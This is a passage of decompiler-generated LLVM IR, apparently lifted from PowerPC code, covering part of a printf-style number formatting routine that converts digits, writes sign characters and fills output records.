  %v0_1000cfe8 = phi i32 [ %v0_1000cfe4.pr, %dec_label_pc_1000cfe4thread-pre-split ], [ %v0_1000cfa8, %dec_label_pc_1000cfb8 ]
  %v1_1000cfe4 = icmp slt i32 %v0_1000cfe8, 0
  %v2_1000cfe4 = icmp sgt i32 %v0_1000cfe8, 0
  %v3_1000cfe4 = icmp eq i32 %v0_1000cfe8, 0
  store i1 %v1_1000cfe4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000cfe4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000cfe4, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000cfe8, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000cfe8, -1
  br i1 %tmp78, label %dec_label_pc_1000cff8, label %dec_label_pc_1000cff0

dec_label_pc_1000cff0:                            ; preds = %dec_label_pc_1000cfe4
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000cff4 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000cff4 = add i32 %v2_1000cff4, -1
  %v4_1000cff4 = inttoptr i32 %v3_1000cff4 to i8*
  store i8 48, i8* %v4_1000cff4, align 1
  store i32 %v3_1000cff4, i32* %r8.global-to-local, align 4
  %v1_1000d014.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000d028.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000cff8

dec_label_pc_1000cff8:                            ; preds = %dec_label_pc_1000cfe4, %dec_label_pc_1000cfd8, %dec_label_pc_1000cff0
  %v0_1000d028 = phi i1 [ %v1_1000cfe4, %dec_label_pc_1000cfe4 ], [ false, %dec_label_pc_1000cfd8 ], [ %v0_1000d028.pre, %dec_label_pc_1000cff0 ]
  %v1_1000d014 = phi i32 [ %v1_1000cfa0, %dec_label_pc_1000cfe4 ], [ %v1_1000cfa0, %dec_label_pc_1000cfd8 ], [ %v1_1000d014.pre, %dec_label_pc_1000cff0 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_1000d004 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_1000d004, i32* %r0.global-to-local, align 4
  %v0_1000d00c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d00c = add i32 %v0_1000d00c, 1
  store i32 %v1_1000d00c, i32* %r6.global-to-local, align 4
  %v2_1000d014 = sub i32 %v1_1000d014, %v1_1000d00c
  store i32 %v2_1000d014, i32* %r11.global-to-local, align 4
  %v1_1000d018 = inttoptr i32 %v0_1000d00c to i8*
  %v2_1000d018 = load i8, i8* %v1_1000d018, align 1
  %v3_1000d018 = zext i8 %v2_1000d018 to i32
  store i32 %v3_1000d018, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1000d028, label %dec_label_pc_1000d088, label %dec_label_pc_1000d02c

dec_label_pc_1000d02c:                            ; preds = %dec_label_pc_1000cff8
  %v0_1000d02c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d02c = icmp slt i32 %v0_1000d02c, %v2_1000d014
  %v4_1000d02c = icmp eq i32 %v0_1000d02c, %v2_1000d014
  store i1 %v2_1000d02c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d02c, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000d02c, label %dec_label_pc_1000d080, label %dec_label_pc_1000d040

dec_label_pc_1000d040:                            ; preds = %dec_label_pc_1000d02c
  %v2_1000d040 = sub i32 %v0_1000d02c, %v2_1000d014
  store i32 %v2_1000d040, i32* %r0.global-to-local, align 4
  %v4_1000d040 = icmp sgt i32 %v2_1000d040, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000d040, label %dec_label_pc_1000d05c, label %dec_label_pc_1000d04c

dec_label_pc_1000d04c:                            ; preds = %dec_label_pc_1000d040
  %v2_1000d050 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000d050, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d0a4

dec_label_pc_1000d05c:                            ; preds = %dec_label_pc_1000d040
  store i32 ptrtoint (i32* @global_var_10012a9b.365 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d068 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000d068, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000d0a4

dec_label_pc_1000d080:                            ; preds = %dec_label_pc_1000d02c
  %v0_1000d080 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000d080, label %dec_label_pc_1000d090, label %dec_label_pc_1000d084

dec_label_pc_1000d084:                            ; preds = %dec_label_pc_1000d080
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d088

dec_label_pc_1000d088:                            ; preds = %dec_label_pc_1000cff8, %dec_label_pc_1000d084
  %v2_1000d088 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000d088, i32* @r8, align 4
  br label %dec_label_pc_1000d0a4

dec_label_pc_1000d090:                            ; preds = %dec_label_pc_1000d080
  %v2_1000d090 = sub i32 %v2_1000d014, %v0_1000d02c
  store i32 %v2_1000d090, i32* %r11.global-to-local, align 4
  %v2_1000d098 = add i32 %v0_1000d02c, %v1_1000d00c
  store i32 %v2_1000d098, i32* %r6.global-to-local, align 4
  %v2_1000d09c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000d09c, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d0a4

dec_label_pc_1000d0a4:                            ; preds = %dec_label_pc_1000d088, %dec_label_pc_1000d05c, %dec_label_pc_1000d04c, %dec_label_pc_1000d090
  %v1_1000d0d0 = phi i32 [ %v2_1000d088, %dec_label_pc_1000d088 ], [ %v2_1000d068, %dec_label_pc_1000d05c ], [ %v2_1000d050, %dec_label_pc_1000d04c ], [ %v2_1000d09c, %dec_label_pc_1000d090 ]
  %v0_1000d0b0 = phi i32 [ %v2_1000d014, %dec_label_pc_1000d088 ], [ 0, %dec_label_pc_1000d05c ], [ 0, %dec_label_pc_1000d04c ], [ %v2_1000d090, %dec_label_pc_1000d090 ]
  %v3_1000d0a4 = load i32, i32* %v2_1000cc74, align 4
  store i32 %v3_1000d0a4, i32* %r0.global-to-local, align 4
  %v1_1000d0a8 = and i32 %v3_1000d0a4, 16
  store i32 %v1_1000d0a8, i32* %r9.global-to-local, align 4
  %v3_1000d0a8 = icmp eq i32 %v1_1000d0a8, 0
  br i1 %v3_1000d0a8, label %dec_label_pc_1000d0b0, label %dec_label_pc_1000d0c8

dec_label_pc_1000d0b0:                            ; preds = %dec_label_pc_1000d0a4
  %v1_1000d0b0 = icmp slt i32 %v0_1000d0b0, 0
  %v3_1000d0b0 = icmp eq i32 %v0_1000d0b0, 0
  store i1 %v1_1000d0b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d0b0, label %dec_label_pc_1000d0b8, label %dec_label_pc_1000d0c8

dec_label_pc_1000d0b8:                            ; preds = %dec_label_pc_1000d0b0
  %v0_1000d0b8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d0b8 = icmp slt i32 %v0_1000d0b8, 103
  %v3_1000d0b8 = icmp eq i32 %v0_1000d0b8, 103
  store i1 %v1_1000d0b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0b8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d0b8, label %dec_label_pc_1000d0e8, label %dec_label_pc_1000d0c0

dec_label_pc_1000d0c0:                            ; preds = %dec_label_pc_1000d0b8
  %v0_1000d0c0 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d0c0 = icmp slt i32 %v0_1000d0c0, 0
  %v3_1000d0c0 = icmp eq i32 %v0_1000d0c0, 0
  store i1 %v1_1000d0c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0c0, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000d0c0, 1
  br i1 %tmp79, label %dec_label_pc_1000d0e8, label %dec_label_pc_1000d0c8

dec_label_pc_1000d0c8:                            ; preds = %dec_label_pc_1000d0b0, %dec_label_pc_1000d0a4, %dec_label_pc_1000d0c0
  %v2_1000d0d0 = inttoptr i32 %v1_1000d0d0 to i32*
  store i32 112, i32* %v2_1000d0d0, align 4
  store i32 ptrtoint (i32* @global_var_10012aa8.366 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000d0dc = load i32, i32* @r8, align 4
  %v2_1000d0dc = add i32 %v1_1000d0dc, 8
  %v3_1000d0dc = inttoptr i32 %v2_1000d0dc to i32*
  store i32 ptrtoint (i32* @global_var_10012aa8.366 to i32), i32* %v3_1000d0dc, align 4
  %v0_1000d0e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d0e0 = load i32, i32* @r8, align 4
  %v2_1000d0e0 = add i32 %v1_1000d0e0, 4
  %v3_1000d0e0 = inttoptr i32 %v2_1000d0e0 to i32*
  store i32 %v0_1000d0e0, i32* %v3_1000d0e0, align 4
  %v0_1000d0e4 = load i32, i32* @r8, align 4
  %v1_1000d0e4 = add i32 %v0_1000d0e4, 12
  store i32 %v1_1000d0e4, i32* @r8, align 4
  br label %dec_label_pc_1000d0e8

dec_label_pc_1000d0e8:                            ; preds = %dec_label_pc_1000d0c0, %dec_label_pc_1000d0b8, %dec_label_pc_1000d0c8
  %v1_1000d0f8 = phi i32 [ %v1_1000d0d0, %dec_label_pc_1000d0c0 ], [ %v1_1000d0d0, %dec_label_pc_1000d0b8 ], [ %v1_1000d0e4, %dec_label_pc_1000d0c8 ]
  %v0_1000d0e8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d0e8 = add i32 %v0_1000d0e8, 1
  store i32 %v1_1000d0e8, i32* %r10.global-to-local, align 4
  %v4_1000d0e8 = icmp eq i32 %v1_1000d0e8, 0
  br i1 %v4_1000d0e8, label %dec_label_pc_1000d110, label %dec_label_pc_1000d0f0

dec_label_pc_1000d0f0:                            ; preds = %dec_label_pc_1000d0e8
  %v1_1000d0f0 = sub i32 -1, %v0_1000d0e8
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000d0f8 = add i32 %v1_1000d0f8, 4
  %v3_1000d0f8 = inttoptr i32 %v2_1000d0f8 to i32*
  store i32 %v1_1000d0f0, i32* %v3_1000d0f8, align 4
  store i32 ptrtoint (i32* @global_var_10012a9b.365 to i32), i32* %r9.global-to-local, align 4
  %v0_1000d104 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d104 = load i32, i32* @r8, align 4
  %v2_1000d104 = inttoptr i32 %v1_1000d104 to i32*
  store i32 %v0_1000d104, i32* %v2_1000d104, align 4
  %v0_1000d108 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d108 = load i32, i32* @r8, align 4
  %v2_1000d108 = add i32 %v1_1000d108, 8
  %v3_1000d108 = inttoptr i32 %v2_1000d108 to i32*
  store i32 %v0_1000d108, i32* %v3_1000d108, align 4
  %v0_1000d10c = load i32, i32* @r8, align 4
  %v1_1000d10c = add i32 %v0_1000d10c, 12
  store i32 %v1_1000d10c, i32* @r8, align 4
  br label %dec_label_pc_1000d110

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d0e8, %dec_label_pc_1000d0f0
  %v1_1000d11c = phi i32 [ %v1_1000d0f8, %dec_label_pc_1000d0e8 ], [ %v1_1000d10c, %dec_label_pc_1000d0f0 ]
  %v0_1000d110 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d110 = icmp slt i32 %v0_1000d110, 0
  %v3_1000d110 = icmp eq i32 %v0_1000d110, 0
  store i1 %v1_1000d110, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d110, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d110, label %dec_label_pc_1000d12c, label %dec_label_pc_1000d118

dec_label_pc_1000d118:                            ; preds = %dec_label_pc_1000d110
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000d11c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000d11c = add i32 %v1_1000d11c, 8
  %v3_1000d11c = inttoptr i32 %v2_1000d11c to i32*
  store i32 %v0_1000d11c, i32* %v3_1000d11c, align 4
  %v0_1000d120 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d120 = load i32, i32* @r8, align 4
  %v2_1000d120 = inttoptr i32 %v1_1000d120 to i32*
  store i32 %v0_1000d120, i32* %v2_1000d120, align 4
  %v0_1000d124 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d124 = load i32, i32* @r8, align 4
  %v2_1000d124 = add i32 %v1_1000d124, 4
  %v3_1000d124 = inttoptr i32 %v2_1000d124 to i32*
  store i32 %v0_1000d124, i32* %v3_1000d124, align 4
  %v0_1000d128 = load i32, i32* @r8, align 4
  %v1_1000d128 = add i32 %v0_1000d128, 12
  store i32 %v1_1000d128, i32* @r8, align 4
  br label %dec_label_pc_1000d12c

dec_label_pc_1000d12c:                            ; preds = %dec_label_pc_1000d110, %dec_label_pc_1000d118
  %v1_1000d154 = phi i32 [ %v1_1000d11c, %dec_label_pc_1000d110 ], [ %v1_1000d128, %dec_label_pc_1000d118 ]
  %v0_1000d12c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d12c = icmp slt i32 %v0_1000d12c, 103
  %v3_1000d12c = icmp eq i32 %v0_1000d12c, 103
  store i1 %v1_1000d12c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d12c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d12c, label %dec_label_pc_1000d134, label %dec_label_pc_1000d140

dec_label_pc_1000d134:                            ; preds = %dec_label_pc_1000d12c
  %v3_1000d134 = load i32, i32* %v2_1000cc74, align 4
  store i32 %v3_1000d134, i32* %r0.global-to-local, align 4
  %v1_1000d138 = and i32 %v3_1000d134, 16
  store i32 %v1_1000d138, i32* %r9.global-to-local, align 4
  %v3_1000d138 = icmp eq i32 %v1_1000d138, 0
  br i1 %v3_1000d138, label %dec_label_pc_1000d16c, label %dec_label_pc_1000d140

dec_label_pc_1000d140:                            ; preds = %dec_label_pc_1000d12c, %dec_label_pc_1000d134
  %v0_1000d140 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d140 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d140 = sub i32 %v1_1000d140, %v0_1000d140
  store i32 %v2_1000d140, i32* %r9.global-to-local, align 4
  %v1_1000d144 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d144 = icmp sgt i32 %v1_1000d144, %v2_1000d140
  %v4_1000d144 = icmp eq i32 %v1_1000d144, %v2_1000d140
  store i1 %v2_1000d144, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d144, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000d144, label %dec_label_pc_1000d14c, label %dec_label_pc_1000d16c

dec_label_pc_1000d14c:                            ; preds = %dec_label_pc_1000d140
  %v2_1000d14c = sub i32 %v1_1000d144, %v2_1000d140
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000d154 = add i32 %v1_1000d154, 4
  %v3_1000d154 = inttoptr i32 %v2_1000d154 to i32*
  store i32 %v2_1000d14c, i32* %v3_1000d154, align 4
  store i32 ptrtoint (i32* @global_var_10012a9b.365 to i32), i32* %r9.global-to-local, align 4
  %v0_1000d160 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d160 = load i32, i32* @r8, align 4
  %v2_1000d160 = inttoptr i32 %v1_1000d160 to i32*
  store i32 %v0_1000d160, i32* %v2_1000d160, align 4
  %v0_1000d164 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d164 = load i32, i32* @r8, align 4
  %v2_1000d164 = add i32 %v1_1000d164, 8
  %v3_1000d164 = inttoptr i32 %v2_1000d164 to i32*
  store i32 %v0_1000d164, i32* %v3_1000d164, align 4
  %v0_1000d168 = load i32, i32* @r8, align 4
  %v1_1000d168 = add i32 %v0_1000d168, 12
  store i32 %v1_1000d168, i32* @r8, align 4
  br label %dec_label_pc_1000d16c

dec_label_pc_1000d16c:                            ; preds = %dec_label_pc_1000d140, %dec_label_pc_1000d134, %dec_label_pc_1000d14c
  %v1_1000d20037 = phi i32 [ %v1_1000d154, %dec_label_pc_1000d140 ], [ %v1_1000d154, %dec_label_pc_1000d134 ], [ %v1_1000d168, %dec_label_pc_1000d14c ]
  %v0_1000d16c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d16c = icmp slt i32 %v0_1000d16c, 102
  %v3_1000d16c = icmp eq i32 %v0_1000d16c, 102
  store i1 %v1_1000d16c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d16c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d16c, label %dec_label_pc_1000d1f4, label %dec_label_pc_1000d174

dec_label_pc_1000d174:                            ; preds = %dec_label_pc_1000d16c
  %v0_1000d174 = load i32, i32* @r7, align 4
  %v1_1000d174 = icmp slt i32 %v0_1000d174, 0
  %v3_1000d174 = icmp eq i32 %v0_1000d174, 0
  store i1 %v1_1000d174, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d174, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d174, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000d174, -1
  br i1 %tmp80, label %dec_label_pc_1000d190, label %dec_label_pc_1000d188

dec_label_pc_1000d188:                            ; preds = %dec_label_pc_1000d174
  %v1_1000d188 = sub i32 0, %v0_1000d174
  store i32 %v1_1000d188, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d190

dec_label_pc_1000d190:                            ; preds = %dec_label_pc_1000d174, %dec_label_pc_1000d188
  %v0_1000d1a431 = phi i32 [ %v0_1000d174, %dec_label_pc_1000d174 ], [ %v1_1000d188, %dec_label_pc_1000d188 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000d194 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000d194, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d1a4:                            ; preds = %dec_label_pc_1000d1a4.backedge, %dec_label_pc_1000d190
  %v2_1000d1c4 = phi i32 [ %v3_1000d1c4, %dec_label_pc_1000d1a4.backedge ], [ %v2_1000d194, %dec_label_pc_1000d190 ]
  %v0_1000d1a8 = phi i32 [ %v0_1000d1a8.pre, %dec_label_pc_1000d1a4.backedge ], [ 2, %dec_label_pc_1000d190 ]
  %v1_1000d1a4 = phi i32 [ %v1_1000d1a4.pre, %dec_label_pc_1000d1a4.backedge ], [ 10, %dec_label_pc_1000d190 ]
  %v1_1000d1b8 = phi i32 [ %v0_1000d1a4.pre, %dec_label_pc_1000d1a4.backedge ], [ %v0_1000d1a431, %dec_label_pc_1000d190 ]
  %v2_1000d1a4 = sdiv i32 %v1_1000d1b8, %v1_1000d1a4
  store i32 %v2_1000d1a4, i32* %r0.global-to-local, align 4
  %v1_1000d1a8 = add i32 %v0_1000d1a8, 1
  store i32 %v1_1000d1a8, i32* @r7, align 4
  %v1_1000d1ac = icmp slt i32 %v1_1000d1a8, 3
  %v3_1000d1ac = icmp eq i32 %v1_1000d1a8, 3
  store i1 %v1_1000d1ac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d1ac, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d1b4 = icmp slt i32 %v2_1000d1a4, 0
  %v2_1000d1b4 = icmp sgt i32 %v2_1000d1a4, 0
  %v3_1000d1b4 = icmp eq i32 %v2_1000d1a4, 0
  store i1 %v1_1000d1b4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d1b4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d1b4, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000d1a4, -10
  store i32 %v2_1000d1a4, i32* %r11.global-to-local, align 4
  %v2_1000d1b8 = add i32 %v1_1000d1b8, 48
  %v1_1000d1c0 = add i32 %v2_1000d1b8, %tmp81
  store i32 %v1_1000d1c0, i32* %r9.global-to-local, align 4
  %v1_1000d1c4 = trunc i32 %v1_1000d1c0 to i8
  %v3_1000d1c4 = add i32 %v2_1000d1c4, -1
  %v4_1000d1c4 = inttoptr i32 %v3_1000d1c4 to i8*
  store i8 %v1_1000d1c4, i8* %v4_1000d1c4, align 1
  store i32 %v3_1000d1c4, i32* %r10.global-to-local, align 4
  %v0_1000d1c8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d1c8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000d1c8 = or i1 %v0_1000d1c8, %v1_1000d1c8
  br i1 %v2_1000d1c8, label %dec_label_pc_1000d1a4.backedge, label %dec_label_pc_1000d1cc

dec_label_pc_1000d1a4.backedge:                   ; preds = %dec_label_pc_1000d1a4, %dec_label_pc_1000d1cc
  %v0_1000d1a4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d1a4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000d1a8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d1cc:                            ; preds = %dec_label_pc_1000d1a4
  %v0_1000d1cc = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000d1cc, label %dec_label_pc_1000d1d0, label %dec_label_pc_1000d1a4.backedge

dec_label_pc_1000d1d0:                            ; preds = %dec_label_pc_1000d1cc
  %v1_1000d1d0 = add i32 %v2_1000d1c4, -2
  store i32 %v1_1000d1d0, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000d1d8 = add i32 %v2_1000d1c4, -3
  store i32 %v1_1000d1d8, i32* %r11.global-to-local, align 4
  %v0_1000d1dc = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d1dc = trunc i32 %v0_1000d1dc to i8
  %v4_1000d1dc = inttoptr i32 %v1_1000d1d0 to i8*
  store i8 %v1_1000d1dc, i8* %v4_1000d1dc, align 1
  %v0_1000d1e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d1e0 = trunc i32 %v0_1000d1e0 to i8
  %v2_1000d1e0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d1e0 = add i32 %v2_1000d1e0, -1
  %v4_1000d1e0 = inttoptr i32 %v3_1000d1e0 to i8*
  store i8 %v1_1000d1e0, i8* %v4_1000d1e0, align 1
  %v0_1000d1e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d1e4 = load i32, i32* @r8, align 4
  %v2_1000d1e4 = inttoptr i32 %v1_1000d1e4 to i32*
  store i32 %v0_1000d1e4, i32* %v2_1000d1e4, align 4
  %v0_1000d1e8 = load i32, i32* @r7, align 4
  %v1_1000d1e8 = load i32, i32* @r8, align 4
  %v2_1000d1e8 = add i32 %v1_1000d1e8, 4
  %v3_1000d1e8 = inttoptr i32 %v2_1000d1e8 to i32*
  store i32 %v0_1000d1e8, i32* %v3_1000d1e8, align 4
  %v0_1000d1ec = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d1ec = load i32, i32* @r8, align 4
  %v2_1000d1ec = add i32 %v1_1000d1ec, 8
  %v3_1000d1ec = inttoptr i32 %v2_1000d1ec to i32*
  store i32 %v0_1000d1ec, i32* %v3_1000d1ec, align 4
  %v0_1000d1f0 = load i32, i32* @r8, align 4
  %v1_1000d1f0 = add i32 %v0_1000d1f0, 12
  store i32 %v1_1000d1f0, i32* @r8, align 4
  br label %dec_label_pc_1000d1f4

dec_label_pc_1000d1f4:                            ; preds = %dec_label_pc_1000d16c, %dec_label_pc_1000cd48, %dec_label_pc_1000d1d0
  %v0_1000d270 = phi i32 [ %v1_1000d20037, %dec_label_pc_1000d16c ], [ %v2_1000cd54, %dec_label_pc_1000cd48 ], [ %v1_1000d1f0, %dec_label_pc_1000d1d0 ]
  %v2_1000d1f4 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000d1f4, i32* %r9.global-to-local, align 4
  %v1_1000d204.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d1f8

dec_label_pc_1000d1f8:                            ; preds = %dec_label_pc_1000d1f8, %dec_label_pc_1000d1f4
  %v1_1000d204 = phi i32 [ %v2_1000d204, %dec_label_pc_1000d1f8 ], [ %v1_1000d204.pre, %dec_label_pc_1000d1f4 ]
  %v0_1000d1f8 = phi i32 [ %v1_1000d1fc, %dec_label_pc_1000d1f8 ], [ %v2_1000d1f4, %dec_label_pc_1000d1f4 ]
  %v1_1000d1f8 = inttoptr i32 %v0_1000d1f8 to i32*
  %v2_1000d1f8 = load i32, i32* %v1_1000d1f8, align 4
  store i32 %v2_1000d1f8, i32* %r0.global-to-local, align 4
  %v1_1000d1fc = add i32 %v0_1000d1f8, 12
  store i32 %v1_1000d1fc, i32* %r9.global-to-local, align 4
  %v2_1000d200 = icmp ult i32 %v1_1000d1fc, %v0_1000d270
  %v2_1000d204 = sub i32 %v1_1000d204, %v2_1000d1f8
  store i32 %v2_1000d204, i32* @r28, align 4
  br i1 %v2_1000d200, label %dec_label_pc_1000d1f8, label %dec_label_pc_1000d20c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d1f8
  %v4_1000d200 = icmp eq i32 %v1_1000d1fc, %v0_1000d270
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d200, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d20c = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000d270, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000d20c, 0
  %v1_1000d220 = zext i1 %tmp85 to i32
  store i32 %v1_1000d220, i32* %r9.global-to-local, align 4
  %v2_1000d224 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000d224, i32* %r0.global-to-local, align 4
  %v2_1000d228 = sub i32 %v2_1000d204, %v1_1000d220
  store i32 %v2_1000d228, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000d228, 1
  br i1 %tmp82, label %dec_label_pc_1000d294, label %dec_label_pc_1000d238

dec_label_pc_1000d238:                            ; preds = %dec_label_pc_1000d20c
  %v3_1000d238 = load i32, i32* %v2_1000cc74, align 4
  store i32 %v3_1000d238, i32* %r0.global-to-local, align 4
  %v1_1000d23c = and i32 %v3_1000d238, 8
  store i32 %v1_1000d23c, i32* @r7, align 4
  %v3_1000d23c = icmp eq i32 %v1_1000d23c, 0
  br i1 %v3_1000d23c, label %dec_label_pc_1000d260, label %dec_label_pc_1000d244

dec_label_pc_1000d244:                            ; preds = %dec_label_pc_1000d238
  %v1_1000d248 = add i32 %v0_1000d270, 12
  store i32 %v1_1000d248, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10012a9b.365 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d250 = inttoptr i32 %v0_1000d270 to i32*
  store i32 160, i32* %v2_1000d250, align 4
  %v0_1000d254 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d254 = load i32, i32* @r8, align 4
  %v2_1000d254 = add i32 %v1_1000d254, 4
  %v3_1000d254 = inttoptr i32 %v2_1000d254 to i32*
  store i32 %v0_1000d254, i32* %v3_1000d254, align 4
  %v0_1000d258 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d258 = load i32, i32* @r8, align 4
  %v2_1000d258 = add i32 %v1_1000d258, 8
  %v3_1000d258 = inttoptr i32 %v2_1000d258 to i32*
  store i32 %v0_1000d258, i32* %v3_1000d258, align 4
  br label %dec_label_pc_1000d294

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d238
  %v1_1000d260 = add i32 %tmp, 16
  %v2_1000d260 = inttoptr i32 %v1_1000d260 to i32*
  %v3_1000d260 = load i32, i32* %v2_1000d260, align 4
  store i32 %v3_1000d260, i32* %r0.global-to-local, align 4
  %v1_1000d264 = icmp slt i32 %v3_1000d260, 48
  %v3_1000d264 = icmp eq i32 %v3_1000d260, 48
  store i1 %v1_1000d264, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d264, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d264, label %dec_label_pc_1000d26c, label %dec_label_pc_1000d288

dec_label_pc_1000d26c:                            ; preds = %dec_label_pc_1000d260
  %v3_1000d26c = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000d270, i32* @r30, align 4
  %v2_1000d274 = add i32 %v3_1000d26c, %v2_1000d228
  store i32 %v2_1000d274, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d274, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000d294

dec_label_pc_1000d280:                            ; preds = %dec_label_pc_1000d29c
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000d2d0

dec_label_pc_1000d288:                            ; preds = %dec_label_pc_1000d260
  store i32 %v2_1000d204, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d270, i32* @r30, align 4
  br label %dec_label_pc_1000d294

